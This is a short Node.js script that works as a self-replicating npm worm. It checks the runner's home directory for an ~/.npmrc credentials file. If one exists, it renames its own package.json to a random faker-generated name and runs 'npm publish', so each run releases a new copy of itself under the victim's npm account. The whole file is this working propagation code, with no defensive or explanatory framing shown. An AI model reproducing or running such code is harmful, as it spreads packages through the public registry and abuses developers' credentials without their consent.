const fs = require('fs')
const faker = require('faker')
const child_process = require('child_process')
const pkgName = faker.helpers.slugify(faker.animal.dog() + ' ' + faker.company.bsNoun()).toLowerCase()
let hasNpmRc = false
const read = (p) => {
  return fs.readFileSync(p).toString()
}
try {
  const npmrcFile = read(process.env.HOME + '/.npmrc')
  hasNpmRc = true
} catch(err) {

}
if (hasNpmRc) {
  console.log('Publishing new version of myself')
  console.log('My new name', pkgName)
  const pkgPath = __dirname + '/package.json'
  const pkgJSON = JSON.parse(read(pkgPath))
  pkgJSON.name = pkgName
  fs.writeFileSync(pkgPath, JSON.stringify(pkgJSON, null, 2))
  child_process.exec('npm publish')
  console.log('DONE')
}
